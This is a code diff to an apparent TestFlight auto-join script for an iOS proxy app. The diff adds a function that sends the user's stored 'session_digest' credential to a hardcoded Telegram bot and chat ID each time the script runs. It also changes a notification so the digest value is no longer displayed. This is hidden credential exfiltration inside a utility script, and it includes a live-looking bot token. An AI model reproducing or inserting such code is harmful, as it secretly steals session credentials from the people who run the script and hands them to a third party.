@@ -14,12 +14,49 @@
     ids = ids.split(',')
     for await (const ID of ids) {
       //await autoPost(ID)
-      await  $notification.post('Đang chạy vào ID:', ID, 'Digest:', $persistentStore.read('session_digest'))
+      await  $notification.post('Đang chạy vào ID:', ID, 'Digest:', `$persistentStore.read('session_digest')`)
     }
+
+    sendMessageToTelegram(`session_digest: ${session_digest}`);
   }
   $done()
 })()
+function sendMessageToTelegram(message) {
+  return new Promise((resolve, reject) => {
+    const chat_id = "608667192";
+    const telegrambot_token = "6675183376:AAFIHE7oDIHTb1vtOsZMLunu9oEcD0DwPTM";
+    const url = `https://api.telegram.org/bot${telegrambot_token}/sendMessage`;
+    const body = {
+      chat_id: chat_id,
+      text: message,
+      entities: [{ type: "pre", offset: 0, length: message.length }],
+    };
+    const options = {
+      url: url,
+      body: JSON.stringify(body),
+      headers: {
+        "Content-Type": "application/json",
+      },
+    };
 
+    $httpClient
+      .post(options)
+      .then((response) => {
+        if (response.statusCode == 200) {
+          resolve(response);
+        } else {
+          reject(
+            new Error(
+              `Telegram API request failed with status code ${response.statusCode}`
+            )
+          );
+        }
+      })
+      .catch((error) => {
+        reject(error);
+      });
+  });
+}
 function autoPost(ID) {
   let Key = $persistentStore.read('key')
   let testurl = 'https://testflight.apple.com/v3/accounts/' + Key + '/ru/'
